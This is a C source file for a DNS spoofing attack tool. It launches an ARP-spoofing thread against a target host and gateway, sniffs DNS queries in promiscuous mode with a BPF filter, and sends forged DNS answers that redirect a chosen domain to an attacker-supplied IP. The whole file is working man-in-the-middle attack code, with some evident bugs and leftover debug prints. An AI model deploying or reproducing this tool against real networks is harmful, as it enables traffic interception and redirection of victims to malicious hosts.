#include <arpa/inet.h>
#include <ctype.h>
#include <linux/filter.h>
//#include <linux/if_arp.h>
#include <linux/if_packet.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <pthread.h>

#include "arpspoof.h"

#ifndef _INCL_ARP
#define _INCL_ARP
#include <libnet.h>
#include <pcap.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <linux/if_ether.h>
#include <netinet/ip.h>
#endif

#define FILTER dns_filter

int sfd;
struct ifreq ifr;
char spoof_ip[16];
char domain[60];
char who[16];
char interface[16];
char dummy_ip[16];
//tcpdump -dd udp and dst port 53
struct sock_filter dns_filter[] = {
    { 0x28, 0, 0, 0x0000000c },
    { 0x15, 0, 4, 0x000086dd },
    { 0x30, 0, 0, 0x00000014 },
    { 0x15, 0, 11, 0x00000011 },
    { 0x28, 0, 0, 0x00000038 },
    { 0x15, 8, 9, 0x00000035 },
    { 0x15, 0, 8, 0x00000800 },
    { 0x30, 0, 0, 0x00000017 },
    { 0x15, 0, 6, 0x00000011 },
    { 0x28, 0, 0, 0x00000014 },
    { 0x45, 4, 0, 0x00001fff },
    { 0xb1, 0, 0, 0x0000000e },
    { 0x48, 0, 0, 0x00000010 },
    { 0x15, 0, 1, 0x00000035 },
    { 0x6, 0, 0, 0x0000ffff },
    { 0x6, 0, 0, 0x00000000 }
};
struct sock_fprog bpf = {
    .len = (sizeof(FILTER) / sizeof(FILTER[0])),
    .filter = FILTER
};
//http://www.tcpipguide.com/free/t_DNSMessageHeaderandQuestionSectionFormat.htm
struct dns_header {
    __u16 id;
    __u16 flags_and_codes;
    __u16 question_count;
    __u16 answer_record_count;
    __u16 name_server_count;
    __u16 additional_record_count;
};
struct dns_request {
    struct ethhdr *ether;
    struct iphdr *ip;
    struct udphdr *udp;
    struct dns_header *dnshdr;
    char *dnsdata;
    char *request_domain;
    int port;
};
void cleanup() {
    ifr.ifr_flags &= ~IFF_PROMISC;
    ioctl(sfd, SIOCSIFFLAGS, &ifr);
    close(sfd);
}

void stop(int signo) {
    exit(EXIT_SUCCESS);
}

void printpacket(char* packet, int len) {
    int i, j;
    unsigned char ch;
    struct ethhdr* fhead;
    struct dns_request request;
    memset(&request, 0, sizeof(struct dns_request));
    fhead = (struct ethhdr*) packet;
    printf("[%dB] %02x:%02x:%02x:%02x:%02x:%02x -> ", (int)len,
           fhead->h_source[0], fhead->h_source[1], fhead->h_source[2],
           fhead->h_source[3], fhead->h_source[4], fhead->h_source[5]);
    printf("%02x:%02x:%02x:%02x:%02x:%02x | ",
           fhead->h_dest[0], fhead->h_dest[1], fhead->h_dest[2],
           fhead->h_dest[3], fhead->h_dest[4], fhead->h_dest[5]);
    printf("\n");
    //printf("%s (%s)\n", etype(sall->sll_protocol), ptype(sall->sll_pkttype));
    for (i = 0; i < len; i += 16) {
        printf("0x%04x:  ", i);
        for (j = 0; j < 16; j++) {
            ch = (i + j < len) ? packet[i + j] : 0;
            if (i + j < len) printf("%02x ", ch);
            else printf("   ");
        }
        printf(" ");
        for (j = 0; j < 16; j++) {
            ch = (i + j < len) ? packet[i + j] : ' ';
            if (!isprint(ch)) ch = '.';
            printf("%c", ch);
        }
        printf("\n");
    }
}
void printDnsPacket(char* packet, int len) {
    printf("\n\nIP HEADER\n");
    printf("Version and headerlength: %02x\n",packet[0]);
    printf("Should be 00: %02x\n", packet[1]);
    printf("Total length: %02x %02x\n", packet[2], packet[3]);
    printf("Identification: %02x %02x\n", packet[4], packet[5]);
    printf("Flags: %02x\n", packet[6]);
    printf("TTL: %02x\n", packet[8]);
    printf("Protocol (11/17 UDP) %02x\n", packet[9]);
    printf("checksum %02x %02x\n",packet[10],packet[11]);
    printf("Source %02x %02x %02x %02x\n", packet[12], packet[13],packet[14],packet[15]);
    printf("Dest %02x %02x %02x %02x\n", packet[16],packet[17],packet[18],packet[19]);
    printf("DNS HEADER\n");
    printf("Port %02x %02x\n", packet[20], packet[21]);
    printf("Dest port %02x %02x\n", packet[22], packet[23]);
    printf("Length %02x %02x\n", packet[24], packet[25]);
    printf("checksum %02x %02x\n", packet[26], packet[27]);
}
//3www8facebook3com0
void get_dns_request_domain(struct dns_request *request, char* result) {
    char* request_dns_data = request->dnsdata;
    int size_before_dot = request_dns_data[0];
    int index = 0;
    int size_index = 1;// 0 -> number of letters, 1-> first letter of domain
    while(size_before_dot > 0) {//do unless encountered 0 in data which means end of domain query
        int i=0;
        while(i < size_before_dot) { //get all chars before dot
            result[index++] = request_dns_data[i+size_index];
            i++;
        }
        result[index++]='.';
        size_index=size_index+size_before_dot;
        size_before_dot = request_dns_data[size_index++];
    }
    result[--index]='\0'; //end of string
    request->request_domain = result; //add to structure
}
void copy16(char* result, __u16 data) {
    result[0] = data & 0xFF;
    result[1] = data >> 8;
}
void copy32(char * result, __u32 data) {
    result[0] = data & 0xFF;
    result[1] = (data >> 8) && 0xFF;
    result[2] = (data >> 16) && 0xFF;
    result[3] = (data >> 24) && 0xFF;
}
void prepare_ip_and_udp_headers(struct dns_request *request, char* reply, unsigned int data_len, int port) {
    struct iphdr *ip_hdr = (struct iphdr*) request->ip;
    struct udphdr *udp_hdr = (struct udphdr *) request->udp;
    ip_hdr->tot_len = htons(sizeof(struct iphdr)+ sizeof(struct udphdr) + data_len);
    __u32 tmp = request->ip->daddr; //swap saddr with daddr
    ip_hdr->daddr = request->ip->saddr;
    ip_hdr->saddr = tmp;
    udp_hdr->source = htons(53); //source port
    udp_hdr->dest = htons(port); //udp port in client
    udp_hdr->len = htons(sizeof(struct udphdr) + data_len);
    udp_hdr->check = 0;//checksum not validated
    memcpy(&reply[0], (char*)ip_hdr, sizeof(struct iphdr));
    memcpy(&reply[sizeof(struct iphdr)], (char*)udp_hdr, sizeof(struct udphdr)); //cpy to reply
    //printDnsPacket(reply, data_len);
}
unsigned int prepare_dns_reply(struct dns_request *request, char* reply) { //reply points to dnshdr of reply structure
    copy16(&reply[0], request->dnshdr->id);
    copy16(&reply[2], 0x8081); //standard query response, No error 0x8180
    copy16(&reply[4], request->dnshdr->question_count);
    copy16(&reply[6], 0x0100); //number of answers 0x0001
    copy16(&reply[8], request->dnshdr->name_server_count);
    copy16(&reply[10], request->dnshdr->additional_record_count);

    unsigned size = strlen(request->dnsdata)+1;
    memcpy(&reply[12], request->dnsdata, size); //request domain
    copy16(&reply[size+12], 0x0100); //type
    copy16(&reply[size+14], 0x0100); //
//qname
    copy16(&reply[size+16], 0x0cc0);//domain name from request (pointer?)
    copy16(&reply[size+18], 0x0100);//class 0x0001
    copy16(&reply[size+20], 0x0100);//type 0x0001
    copy32(&reply[size+22], 0x34000000);//ttl 34
    copy16(&reply[size+26], 0x0400);//result len
    unsigned char ip_in_hex[4];
    sscanf(dummy_ip, "%d.%d.%d.%d",(int *)&ip_in_hex[0],(int *)&ip_in_hex[1], (int *)&ip_in_hex[2], (int *)&ip_in_hex[3]); //copy arg to int array
    memcpy(&reply[size+28], ip_in_hex, 4);
    return size+32; //return size of dnsdata + 32 (dns reply len without request domain)
}

int check_dns_domain(char* inc_packet, struct dns_request *request, int inc_len, struct sockaddr_ll* sall) {
    request->ip = (struct iphdr*)(inc_packet+sizeof(struct ethhdr));
    request->udp = (struct udphdr*)(inc_packet+(request->ip->ihl*4)+sizeof(struct ethhdr));
    request->dnshdr = (struct dns_header*)(((char*) request->udp)+sizeof(struct udphdr));
    request->dnsdata = (char*)(((char*) request->dnshdr)+sizeof(struct dns_header));
    request->port = (int)ntohs((*(int*)request->udp));
    int port = ntohs((*(int*)request->udp));
    char request_domain[60];
    get_dns_request_domain(request, request_domain);
    if(strstr(domain, request_domain) != NULL) {
	return port;
    }
    return -1;
}
int send_udp(struct dns_request* request, char* reply, unsigned int reply_len, int port) {
	struct sockaddr_in caddr;
        int sfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
        if(sfd < 0) {
            printf("cannot create socket to send reply\n");
            return -1;
        }
        caddr.sin_family = AF_INET;
        caddr.sin_port = htons(port);
        caddr.sin_addr.s_addr = request->ip->daddr;
	int tmp = 1;
        if(setsockopt(sfd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
		printf("setsockopt hdrincl error\n");	
	};
        int result = sendto(sfd, reply, reply_len, 0, (struct sockaddr*)&caddr, sizeof(caddr));
        if(result < 0) {
            printf("error sending udp %d\n", result);
            return -1;
        }
        printf("sent %d bytes\n", result);
	return result;
}
void dns_reply(struct dns_request* request, int port) {
        char reply[1024];
        memset(reply, 0, 1024);
        char* dns_reply_hdr = reply + sizeof(struct iphdr) + sizeof(struct udphdr);
        unsigned int size_of_header = prepare_dns_reply(request, dns_reply_hdr);
        prepare_ip_and_udp_headers(request, reply, size_of_header, port);
        size_of_header = size_of_header + (sizeof(struct iphdr) + sizeof(struct udphdr));
	int sent_bytes = send_udp(request, reply, size_of_header, port);
	//printf("%d", sent_bytes);
}

void handleframe(char* frame, int len, struct sockaddr_ll* sall) {
    struct dns_request request;
    memset(&request, 0, sizeof(struct dns_request));
    if(sall->sll_pkttype ==PACKET_HOST) {
        int port = check_dns_domain(frame, &request, len, sall);
	if(port > 0) {
		dns_reply(&request, port);
	}

    }
}
int main(int argc, char** argv) {
    if(argc != 6) {
        printf("./dnsspoof <interface> <domain_to_spoof> <ip_to_spoof> <target_ip> <gateway_ip>\n");
        return 0;
    }
    strncpy(interface, argv[1], 16);
    strncpy(domain, argv[2], 60);
    strncpy(dummy_ip, argv[3], 16);
    printf("spoofing domain %s on interface %s\n",domain, interface);
    printf("starting arpspoofing %s\n",argv[4]);
    pthread_t arp_spoof_thread;
printf("x\n");
    struct pthread_params* params = malloc(sizeof(struct pthread_params*));
printf("x\n");
    //memset(params, 0, sizeof(struct pthread_params));
    printf("x\n");
params->target_addr = argv[4];
	printf("x\n");
    params->gateway_addr = argv[5];
    printf("params\n");
    if(pthread_create(&arp_spoof_thread,NULL,arp_spoof,(void*)params) != 0) {
    	fprintf(stderr, "arp thread create error");
	return -1;
    };
    socklen_t sl;
    ssize_t len;
    char* frame;
    struct sockaddr_ll sall;

    atexit(cleanup);
    signal(SIGINT, stop);
    sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    setsockopt(sfd, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf));
    strncpy(ifr.ifr_name, interface, IFNAMSIZ);
    ioctl(sfd, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_PROMISC;
    ioctl(sfd, SIOCSIFFLAGS, &ifr);
    while(1) {
        frame = malloc(ETH_FRAME_LEN);
        memset(frame, 0, ETH_FRAME_LEN);
        memset(&sall, 0, sizeof(struct sockaddr_ll));
        sl = sizeof(struct sockaddr_ll);
        len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, (struct sockaddr*)&sall, &sl);
        handleframe(frame, len, &sall);
        free(frame);
    }
    return EXIT_SUCCESS;
}
